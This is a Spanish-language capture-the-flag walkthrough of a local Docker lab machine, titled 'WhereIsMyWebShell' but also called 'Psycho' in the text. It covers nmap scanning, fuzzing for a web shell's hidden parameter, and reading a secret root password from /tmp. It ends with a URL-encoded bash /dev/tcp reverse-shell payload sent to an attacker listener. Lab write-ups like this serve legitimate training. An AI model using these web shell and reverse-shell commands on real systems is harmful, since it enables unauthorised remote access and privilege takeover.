### Informe de máquina *"WhereIsMyWebShell"*

![Máquina Psycho](./screenshots/01_maquina.png)

Vamos a realizar la maquina "Psycho", como siempre vamos a empezar asignando permisos de ejecución al archivo `auto_deploy.sh` eh inicializamos la maquina con `sudo ./autodeploy ` `psycho.tar`

![Permisos ejecución deploy](./screenshots/02_permisos_ejecucion_deploy.png)
![Inicialización máquina](./screenshots/03_inicializacion_maquina.png)

Realizamos un testeo de conexión con el comando `ping`.
Y realizamos un escaneo de puertos abiertos con la herramienta `nmap`, el comando usado fue:

```bash
nmap -sS --min-rate 5000 -p- -vvv -Pn -n 172.17.0.2 -oG nmap
```

- `nmap` → Comando para ejecutar herramienta nmap.
- `-sS` → Escaneo SYN ("Stealth Scan"). Envía paquetes SYN sin completar la conexión TCP (más rápido y sigiloso que -sT).
- `--min-rate 5000` → Fuerza a nmap a enviar al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-p-` → Escanea todos los 65535 puertos (en lugar de solo los más comunes).
- `-vvv` → Modo muy detallado (muestra más información en pantalla mientras se ejecuta).
- `-Pn` → No realiza detección de host (asume que el host está activo y no envía ping previo).
- `-n` → No resuelve nombres de dominio (evita consultas DNS, lo que acelera el escaneo).
- `172.17.0.2` → IP objetivo a escanear.
- `-oG nmap` → Guarda los resultados en formato "greppable" en un archivo llamado nmap.

![Test de conexión](./screenshots/04_escaneo_puertos_abiertos.png)

Encontramos que el puerto 80 se encuentrá abierto, realizamos un escaneo más detallado de este puerto.

![Escaneo detalle puerto 80](./screenshots/05_escaneo_puerto80.png)

Procedemos a revisar el contenido de la página web.

![Página web](./screenshots/06_pagina_web.png)
![Código fuente de página web](./screenshots/07_codigo_fuente_pagina.png)

Casi al final de la página podemos encontrar un mensaje que dice "Guardo un secreto que guardo en /tmp". Guardamos este dato para despues.

Por ahora realizamos un ataque de fuzzing para encontrar directorios o páginas en el servidor web.

![Ataque de Fuzzing](./screenshots/08_ataque_fuzzing.png)

Encontramos dos páginas, una "shell.php" y otra "warning.html".

![Web warning](./screenshots/09_web_warning.png)

En "warning.html" encontramos un mensaje que dice: "...su web shell tiene un parametro que no recuerto...", podemos concluir que la página "shell.php" espera un parametro.

![Ejemplo web shell en php](./screenshots/10_ejemplo_codigo_shell_php.png)

Investigando un poco del funcionamiento de una web shell con php, si identificamos el nombre del parametro le podemos mandar una instrucción para que sea ejecutada.

Realizaremos un ataque de fuzzing, donde la página "shell.php" reciba el nombre de un parametro y que ejecute el comando `id`. Haciendo uso de la herramienta `wfuzz`


```bash
wfuzz -c  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --sc 200 'http://172.17.0.2/shell.php?FUZZ=id'
```

![Fuzzing id de web shell](./screenshots/11_id_shell.png)

Encontramos que el nombre del parámetro para la ejecución de la web shell es "parameter".

![Acceso a web shell](./screenshots/12_acceso_shell.png)

Recordando el primer mensaje pista, realizamos un listado de todos los archivos en `/tmp`, recordando que estamos en un navegador debemos remplazar algunos símbolos como `/` o `.`.
Es decir, para ejecutar el comando `ls -la /tmp` ejecutaremos: `ls -la %2Ftmp`, nos podemos apoyar de algun codificador como [urlencoder](https://www.urlencoder.org/es/)

Ejecutamos:
```
172.17.0.2/shell.php?parameter=ls -la %2Ftmp
```

![Contenido en tmp](./screenshots/14_ls_tmp.png)

Identificamos un archivo oculto llamado `.secret.txt`
Ejecutamos el comando:

```
172.17.0.2/shell.php?parameter=cat %2Ftmp%2F.secret.txt
```

![Lectura secret.txt](./screenshots/15_passwd_root.png)

Encontramos una contraseña al parecer del usuario root.
Para realizar una mejor ejecución de los comandos vamos a realizar una reverse shell.

Primero empezamos por definir un puerto en escucha en nuestra máquina atacante, en este caso el puerto 4433, con el comando: `sudo nc -lvnp 4433`

![Escucha puerto 4433](./screenshots/16_reverse_shell_listening_port.png)

Y en el navegador el comando `bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'` donde `$RHOST` es la ip de nuestra maquina atacante y `$RPORT` es el puerto que definimos para la escucha:
Compilando este comando y ejecutandolo en el navegador quedaria:

```
172.17.0.2/shell.php?parameter=bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.0.2.15%2F4433 0>%261'
```

En unos segundos, observamos que la terminal donde dejamos en escucha el puerto 4433, se nos iniciará una shell.

![Acceso a terminal](./screenshots/17_acceso_terminal.png)

Como revisamos en el archivo `/tmp/.secret.txt` intentamos acceder como usuario `root` con esta contraseña, resultando con éxito.

La contraseña de root era: `contraseñaderoot123`

![Logeo como root](./screenshots/18_acceso_root.png)


